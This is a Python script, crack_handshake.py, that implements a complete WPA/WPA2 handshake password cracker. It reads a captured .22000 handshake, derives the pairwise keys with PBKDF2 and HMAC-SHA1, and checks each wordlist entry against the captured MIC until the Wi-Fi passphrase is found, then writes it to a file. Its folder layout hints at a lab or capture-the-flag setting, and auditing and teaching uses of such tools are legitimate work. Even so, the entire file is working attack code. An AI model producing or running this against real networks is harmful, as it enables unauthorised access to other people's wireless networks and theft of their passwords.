#!/usr/bin/env python3
"""
crack_handshake.py - WPA handshake password cracker (pure Python).

Usage:
    python3 crack_handshake.py [wordlist]

Auto-finds the handshake.22000 file in ../files/.
"""

import argparse
import os
import sys
import hashlib
import hmac
import struct


def pmk_from_passphrase(passphrase, ssid):
    return hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)


def prf_512(key, label, a, b):
    result = b""
    for i in range(4):
        hmac_input = label.encode() + b"\x00" + a + b + struct.pack("B", i)
        result += hmac.new(key, hmac_input, hashlib.sha1).digest()
    return result[:64]


def parse_22000(filename):
    with open(filename) as f:
        lines = f.read().strip().splitlines()
    m1 = m2 = None
    for line in lines:
        parts = line.split("*")
        if len(parts) < 8:
            continue
        if parts[1] == "01" and not m1:
            m1 = parts
        elif parts[1] == "02" and not m2:
            m2 = parts
    return m1, m2


def find_handshake():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    files_dir = os.path.join(os.path.dirname(script_dir), "files")
    if os.path.isdir(files_dir):
        for fname in sorted(os.listdir(files_dir)):
            if fname.endswith(".22000"):
                return os.path.join(files_dir, fname)
    candidates = [
        os.path.join(files_dir, "handshake.22000"),
        os.path.join(script_dir, "handshake.22000"),
    ]
    for c in candidates:
        if os.path.exists(c):
            return c
    return None


def find_wordlists():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    wordlist_dir = os.path.join(script_dir, "wordlists")
    lists = []
    if os.path.isdir(wordlist_dir):
        for f in sorted(os.listdir(wordlist_dir)):
            if f.endswith(".txt"):
                lists.append(os.path.join(wordlist_dir, f))
    return lists


def crack(hs_file, wordlist_path, out_file="cracked.txt"):
    m1, m2 = parse_22000(hs_file)
    if not m2:
        print("[-] No M2 handshake record found")
        return False

    mic_hex    = m2[2]
    bssid_hex  = m2[3]
    sta_hex    = m2[4]
    ssid_hex   = m2[5]
    anonce_hex = m2[6]
    eapol_hex  = m2[7]

    ssid = bytes.fromhex(ssid_hex).decode("utf-8", errors="replace")
    apmac = bytes.fromhex(bssid_hex)
    sta = bytes.fromhex(sta_hex)
    anonce = bytes.fromhex(anonce_hex)
    target_mic = bytes.fromhex(mic_hex)
    eapol_frame = bytes.fromhex(eapol_hex)
    snonce = eapol_frame[17:49]

    if len(snonce) != 32:
        print(f"[-] Invalid SNonce length: {len(snonce)}")
        return False

    print(f"[*] SSID:   {ssid}")
    print(f"[*] BSSID:  {bssid_hex}")
    print(f"[*] STA:    {sta_hex}")
    print()

    if apmac < sta:
        addr = apmac + sta
    else:
        addr = sta + apmac
    if anonce < snonce:
        nonces = anonce + snonce
    else:
        nonces = snonce + anonce

    total = 0
    with open(wordlist_path, encoding="utf-8", errors="ignore") as wl:
        for line in wl:
            pwd = line.strip()
            if not pwd:
                continue
            total += 1
            if total % 500 == 0:
                print(f"  [{total}] trying: {pwd[:20]}...")

            pmk = pmk_from_passphrase(pwd, ssid)
            ptk = prf_512(pmk, "Pairwise key expansion", addr, nonces)
            kck = ptk[:16]

            frame = bytearray(eapol_frame)
            frame[81:97] = b"\x00" * 16
            computed = hmac.new(kck, bytes(frame), hashlib.sha1).digest()[:16]

            if computed == target_mic:
                print(f"\n{'=' * 60}")
                print(f"  PASSWORD FOUND: {pwd}")
                print(f"{'=' * 60}")
                with open(out_file, "w") as f:
                    f.write(f"{bssid_hex}:{pwd}\n")
                return True

    print(f"\n[-] Password not found ({total} attempts)")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="WPA handshake password cracker (pure Python)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("wordlist", nargs="?", default=None,
                        help="Path to wordlist file (optional)")
    parser.add_argument("--list-wordlists", action="store_true",
                        help="Show available built-in wordlists")
    parser.add_argument("--output", "-o", default="cracked.txt",
                        help="Output file (default: cracked.txt)")
    args = parser.parse_args()

    if args.list_wordlists:
        print("\n[*] Available wordlists in tools/wordlists/:")
        for wl in find_wordlists():
            print(f"    {os.path.basename(wl)}  ({os.path.getsize(wl)} bytes)")
        print()
        sys.exit(0)

    hs_file = find_handshake()
    if not hs_file:
        print("[ERROR] No .22000 handshake file found in ../files/")
        sys.exit(1)

    wordlist = args.wordlist
    if not wordlist:
        available = find_wordlists()
        if available:
            wordlist = min(available, key=lambda x: os.path.getsize(x))
            print(f"[*] Auto-selected wordlist: {os.path.basename(wordlist)}")
        else:
            print("[ERROR] No wordlist found. Provide one or use --list-wordlists")
            sys.exit(1)

    if not os.path.exists(wordlist):
        print(f"[ERROR] Wordlist not found: {wordlist}")
        sys.exit(1)

    if os.path.exists(args.output):
        os.remove(args.output)

    print("\n" + "=" * 60)
    print("  WPA Handshake Cracker (pure Python)")
    print("=" * 60)
    print(f"[*] Handshake: {os.path.abspath(hs_file)}")
    print(f"[*] Wordlist:  {os.path.abspath(wordlist)}")
    print()

    found = crack(hs_file, wordlist, args.output)

    print(f"\n{'=' * 60}")
    if found:
        print(f"  RESULT: Password cracked!")
        print(f"  Output: {args.output}")
    else:
        print(f"  RESULT: Password not found.")
        print(f"  Tips: try a larger wordlist (rockyou.txt)")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    main()
